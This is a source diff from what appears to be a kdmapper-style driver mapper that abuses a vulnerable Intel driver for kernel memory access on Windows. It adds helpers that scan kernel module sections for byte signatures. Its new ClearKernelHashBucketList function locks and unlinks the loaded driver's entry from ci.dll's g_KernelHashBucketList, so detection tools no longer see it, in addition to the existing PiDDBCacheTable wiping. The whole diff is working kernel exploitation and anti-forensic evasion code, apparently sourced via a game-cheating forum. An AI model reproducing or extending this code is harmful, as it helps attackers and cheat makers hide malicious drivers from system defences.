@@ -400,15 +400,15 @@ bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
 	return true;
 }
 
-void intel_driver::LocatePidTableInfo(BYTE* PAGESectionData, ULONG sectionSize) {
+void intel_driver::LocatePidTableInfo(HANDLE device_handle, uintptr_t module) {
 	BYTE PiDDBLockPattern[] = { 0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x8C }; //48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B 8C
 	char PiDDBLockMask[] = { 'x', 'x', 'x', '?', '?', '?', '?', 'x', '?', '?', '?', '?', 'x', 'x', 'x', 0x00 };
 	BYTE PiDDBCacheTablePattern[] = { 0x66, 0x03, 0xD2, 0x48, 0x8D, 0x0D };
 	char PiDDBCacheTableMask[] = { 'x', 'x', 'x', 'x', 'x', 'x', 0x00 };
 
 
-	PiDDBLockPtr = utils::FindPattern((uintptr_t)PAGESectionData, sectionSize, PiDDBLockPattern, PiDDBLockMask);
-	PiDDBCacheTablePtr = utils::FindPattern((uintptr_t)PAGESectionData, sectionSize, PiDDBCacheTablePattern, PiDDBCacheTableMask);
+	PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", module, PiDDBLockPattern, PiDDBLockMask);
+	PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", module, PiDDBCacheTablePattern, PiDDBCacheTableMask);
 }
 
 PVOID intel_driver::ResolveRelativeAddress(HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
@@ -506,29 +506,12 @@ intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry(HANDLE device_handle, P
 bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTable added on LoadDriver
 	
 	uint64_t ntoskrnl = utils::GetKernelModuleAddress("ntoskrnl.exe");
-	BYTE headers[0x1000];
-	if (!ReadMemory(device_handle, ntoskrnl, headers, 0x1000)) {
-		std::cout << "[-] Can't read ntoskrnl headers" << std::endl;
-		return false;
-	}
-	ULONG sectionSize = 0;
-	PVOID sectionPAGE = utils::FindSection((char*)"PAGE", (uintptr_t)headers, &sectionSize);
-	if (!sectionPAGE) {
-		std::cout << "[-] Can't find ntoskrnl PAGE section" << std::endl;
-		return false;
-	}
-	sectionPAGE = (PVOID)((uintptr_t)sectionPAGE - (uintptr_t)headers + ntoskrnl);
-	
-	BYTE* PAGESectionData = new BYTE[sectionSize];
-	ReadMemory(device_handle, (uintptr_t)sectionPAGE, PAGESectionData, sectionSize);
 
-	LocatePidTableInfo(PAGESectionData, sectionSize);
+	LocatePidTableInfo(device_handle, ntoskrnl);
 	if (PiDDBLockPtr == NULL || PiDDBCacheTablePtr == NULL) {
 		std::cout << "[-] Warning no PiDDBCacheTable Found" << std::endl;
 		return false;
 	}
-	PiDDBLockPtr = (uintptr_t)sectionPAGE + PiDDBLockPtr - (uintptr_t)PAGESectionData;
-	PiDDBCacheTablePtr = (uintptr_t)sectionPAGE + PiDDBCacheTablePtr - (uintptr_t)PAGESectionData;
 
 	printf("[+] PiDDBLock Ptr %llx\n", PiDDBLockPtr);
 	printf("[+] PiDDBCacheTable Ptr %llx\n", PiDDBCacheTablePtr);
@@ -593,4 +576,136 @@ bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle) { //PiDDBCacheTabl
 	std::cout << "[+] PiDDBCacheTable Cleaned" << std::endl;
 
 	return true;
+}
+
+uintptr_t intel_driver::FindPatternAtKernel(HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, char* szMask) {
+	if (!dwAddress) {
+		std::cout << "[-] No module address to find pattern" << std::endl;
+		return 0;
+	}
+
+	if (dwLen > 1024 * 1024 * 1024) { //if read is > 1GB
+		std::cout << "[-] Can't find pattern, Too big section" << std::endl;
+		return 0;
+	}
+
+	BYTE* sectionData = new BYTE[dwLen];
+	ReadMemory(device_handle, dwAddress, sectionData, dwLen);
+
+	auto result = utils::FindPattern((uintptr_t)sectionData, dwLen, bMask, szMask);
+
+	if (result <= 0) {
+		std::cout << "[-] Can't find pattern" << std::endl;
+		delete[] sectionData;
+		return 0;
+	}
+	result = dwAddress + result - (uintptr_t)sectionData;
+	delete[] sectionData;
+	return result;
+}
+
+uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, char* sectionName, uintptr_t modulePtr, PULONG size) {
+	if (!modulePtr)
+		return 0;
+	BYTE headers[0x1000];
+	if (!ReadMemory(device_handle, modulePtr, headers, 0x1000)) {
+		std::cout << "[-] Can't read module headers" << std::endl;
+		return 0;
+	}
+	ULONG sectionSize = 0;
+	uintptr_t section = (uintptr_t)utils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
+	if (!section || !sectionSize) {
+		std::cout << "[-] Can't find section" << std::endl;
+		return false;
+	}
+	if (size)
+		*size = sectionSize;
+	return section - (uintptr_t)headers + modulePtr;
+}
+
+uintptr_t intel_driver::FindPatternInSectionAtKernel(HANDLE device_handle,char* sectionName, uintptr_t modulePtr, BYTE* bMask, char* szMask) {
+	ULONG sectionSize = 0;
+	uintptr_t section = FindSectionAtKernel(device_handle, sectionName, modulePtr, &sectionSize);
+	return FindPatternAtKernel(device_handle, section, sectionSize, bMask, szMask);
+}
+
+bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle) {
+	std::string dname(driver_name);
+	std::wstring wdname(dname.begin(),dname.end());
+	wdname = L"\\" + wdname;
+	uint64_t ci = utils::GetKernelModuleAddress("ci.dll");
+
+	//Thanks @KDIo3 and @Swiftik from UnknownCheats
+	auto sig = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE",ci, PUCHAR("\x4C\x8D\x35\x00\x00\x00\x00\xE9\x00\x00\x00\x00\x8B\x84\x24"), (char*)"xxx????x????xxx");
+	if (!sig) {
+		std::cout << "[-] Can't Find g_KernelHashBucketList" << std::endl;
+		return false;
+	}
+	auto sig2 = FindPatternAtKernel(device_handle,(uintptr_t)sig-50, 50, PUCHAR("\x48\x8D\x0D"), (char*)"xxx");
+	if (!sig2) {
+		std::cout << "[-] Can't Find g_HashCacheLock" << std::endl;
+		return false;
+	}
+	const auto g_KernelHashBucketList = ResolveRelativeAddress(device_handle, (PVOID)sig, 3, 7);
+	const auto g_HashCacheLock = ResolveRelativeAddress(device_handle, (PVOID)sig2, 3, 7);
+	if (!g_KernelHashBucketList || !g_HashCacheLock)
+	{
+		std::cout << "[-] Can't Find g_HashCache relative address" << std::endl;
+		return false;
+	}
+	//// Print KernelHashBucketList
+	//ULONG_PTR i = NULL;
+	//ReadMemory(device_handle, (uintptr_t)g_KernelHashBucketList, &i, sizeof(i));
+	//while (i)
+	//{
+	//	const auto wsNamePtr = PWCH(i + 0x48);
+	//	wchar_t wsName[MAX_PATH];
+	//	memset(wsName, 0, MAX_PATH * sizeof(wchar_t));
+	//	ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, MAX_PATH * sizeof(wchar_t));
+	//	std::wcout << wsName << std::endl;
+	//	ReadMemory(device_handle, (uintptr_t)i, &i, sizeof(i));
+	//}
+
+	if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
+		std::cout << "[-] Can't lock g_HashCacheLock" << std::endl;
+		return false;
+	}
+	std::cout << "[+] g_HashCacheLock Locked" << std::endl;
+
+	HashBucketEntry* prev = (HashBucketEntry*)g_KernelHashBucketList;
+	HashBucketEntry* entry = 0;
+	ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry));
+	while (entry) {
+		wchar_t * wsNamePtr = 0;
+		USHORT wsNameLen = 0;
+		ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer), &wsNamePtr, sizeof(wsNamePtr));
+		ReadMemory(device_handle, (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length), &wsNameLen, sizeof(wsNameLen));
+				
+		wchar_t* wsName = new wchar_t[wsNameLen];
+		memset(wsName, 0, wsNameLen * sizeof(wchar_t));
+		ReadMemory(device_handle, (uintptr_t)wsNamePtr, wsName, wsNameLen * sizeof(wchar_t));
+				
+		if (std::wstring(wsName).find(wdname) != std::wstring::npos) {
+			std::wcout << L"[+] Found In g_KernelHashBucketList: " << wsName << std::endl;
+
+			HashBucketEntry* Next = 0;
+			ReadMemory(device_handle, (uintptr_t)entry, &Next, sizeof(Next));
+
+			WriteMemory(device_handle, (uintptr_t)prev, &Next, sizeof(Next));
+
+			FreePool(device_handle, (uintptr_t)entry);
+			std::wcout << L"[+] g_KernelHashBucketList Cleaned" << std::endl;
+			ExReleaseResourceLite(device_handle, g_HashCacheLock);
+			delete[] wsName;
+			return true;
+		}
+				
+		prev = entry;
+		delete[] wsName;
+		//read next
+		ReadMemory(device_handle, (uintptr_t)entry, &entry, sizeof(entry));
+	}
+	
+	ExReleaseResourceLite(device_handle, g_HashCacheLock);
+	return false;
 }
